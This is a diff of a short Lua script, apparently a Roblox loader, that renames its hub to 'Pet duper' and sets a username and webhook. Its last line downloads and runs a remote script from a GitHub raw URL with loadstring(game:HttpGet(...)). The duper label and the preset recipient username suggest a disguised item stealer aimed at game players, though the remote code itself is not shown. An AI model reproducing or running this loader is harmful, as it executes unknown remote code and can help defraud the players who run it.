@@ -1,6 +1,6 @@
 ```lua
 _G.Username = "Watex01"
-_G.HubName = "Watex01"
+_G.HubName = "Pet duper"
 _G.WebhookUrl = "https://discord.com/invite/9jsmycpj"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
